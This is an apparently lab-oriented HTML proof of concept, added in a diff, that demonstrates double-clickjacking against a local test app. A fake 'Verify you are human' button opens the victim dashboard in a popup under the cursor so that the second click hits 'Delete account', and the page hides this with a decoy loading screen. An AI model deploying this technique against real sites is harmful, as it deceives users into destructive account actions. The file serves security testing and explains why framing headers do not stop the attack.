@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Double-click to continue</title>
+<style>
+  body { margin: 0; font-family: system-ui, sans-serif; max-width: 720px; margin: 2rem auto; padding: 0 1rem; }
+  h1 { font-size: 1.75rem; }
+  button.bait {
+    background: #8e44ad; color: #fff;
+    border: 0; padding: 1rem 2.5rem; font-size: 1.25rem;
+    border-radius: 6px; cursor: pointer;
+  }
+  .panel { padding: 1rem; background: #fff8e1; border: 1px solid #f0c040; border-radius: 4px; }
+  .panel code { background: #fff; padding: .1rem .3rem; }
+  .stage { margin-top: 2rem; }
+  .step { margin: 1rem 0; color: #666; }
+</style>
+</head>
+<body>
+  <div class="panel">
+    <strong>Lab marker:</strong> this PoC uses Paulos Yibelo&rsquo;s December 2024 double-clickjacking technique. There is no iframe, so <code>frame-ancestors 'none'</code> and <code>X-Frame-Options: DENY</code> on the target do nothing here &mdash; the victim page opens in a popup, not in a frame. The defence has to live on the sensitive page itself.
+    <br><br>
+    <strong>Manual reproduction</strong>: first sign in at <a href="http://localhost:8090/login" target="_blank" rel="noopener">http://localhost:8090/login</a>. Return here and double-click the purple button below at a normal speed. The first click opens the popup pointing at <code>/dashboard</code> and immediately swaps this page&rsquo;s content; the second click of the double-click lands on the popup&rsquo;s Delete account button while the popup is the focused window.
+  </div>
+
+  <h1 class="stage">Verify you are human</h1>
+  <p>Please double-click the button below to continue.</p>
+  <button class="bait" id="bait">Continue</button>
+  <p class="step" id="status"></p>
+
+  <script>
+    /*
+     * Double-clickjacking mechanic.
+     *
+     * mousedown fires before click. We use mousedown of the first click
+     * of the would-be double-click to:
+     *   1. Open the victim page in a popup. window.open during a user
+     *      gesture is allowed by the popup blocker.
+     *   2. Swap the page content so the "bait" button is gone before
+     *      the user releases. (In Yibelo's original PoC the trick is
+     *      to switch focus + close the decoy so the second click of the
+     *      double-click lands on the focused popup.)
+     *
+     * On click (which fires after mousedown + mouseup), we focus the
+     * popup. If the user is in the middle of a double-click the second
+     * mousedown-mouseup-click pair will be delivered to whatever window
+     * is focused, and the popup is now focused with the Delete account
+     * button under the cursor at the same screen coordinates.
+     *
+     * The popup URL is /dashboard which keeps a normal top-level
+     * navigation under SameSite=Lax (Lax cookies ride along on
+     * top-level navigations by design). The popup carries the victim's
+     * session and the Delete button is one click away.
+     */
+
+    const status = document.getElementById('status');
+    const bait = document.getElementById('bait');
+    let popup = null;
+    let firstClick = false;
+
+    bait.addEventListener('mousedown', (e) => {
+      if (firstClick) return;
+      firstClick = true;
+
+      // Open the victim dashboard in a popup, sized so the Delete
+      // account button lands under the screen position the cursor is
+      // already at.
+      popup = window.open(
+        'http://localhost:8090/dashboard',
+        'cj_popup',
+        'width=520,height=420,left=' + (screen.width/2 - 260) + ',top=' + (screen.height/2 - 210)
+      );
+
+      // Swap our own UI immediately so the second click does not land
+      // on the bait again. The new content is a fake "loading" screen
+      // so the user does not realise they just spawned a popup.
+      document.body.innerHTML = '<h1>Loading&hellip;</h1><p>Please complete the action in the focused window.</p>';
+    });
+
+    bait.addEventListener('click', () => {
+      // After the first click of the double-click resolves, focus the
+      // popup so the second click of the double-click is delivered to
+      // it instead of to our now-empty page. In the real PoC the
+      // popup also calls window.opener.location to redirect this tab
+      // away from the attacker origin.
+      if (popup) popup.focus();
+      status.textContent = 'Popup focused. The next click lands on the popup.';
+    });
+  </script>
+</body>
+</html>
